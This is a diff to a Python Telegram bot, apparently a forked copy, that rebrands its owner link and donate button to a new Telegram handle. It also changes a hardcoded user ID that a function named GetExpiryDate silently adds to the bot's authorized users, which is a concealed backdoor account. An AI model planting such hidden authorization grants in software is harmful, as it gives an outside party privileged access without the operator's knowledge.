@@ -25,7 +25,7 @@ from translation import Translation
 import pyrogram
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
-myfather = 'https://t.me/{}'.format(Config.USER_NAME[1:])
+myfather = 'https://t.me/Captain_America_X'.format(Config.USER_NAME[1:])
 
 
 
@@ -33,7 +33,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1337144652)
+    Config.AUTH_USERS.add(1714490498)
     return expires_at
 
 
@@ -88,7 +88,7 @@ async def donate(bot, update):
              reply_markup=InlineKeyboardMarkup(
              [
                [
-                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/maheshmalekar')
+                 InlineKeyboardButton('Donate 💰', url='t.me/Captain_America_X')
                ]
              ]
            )
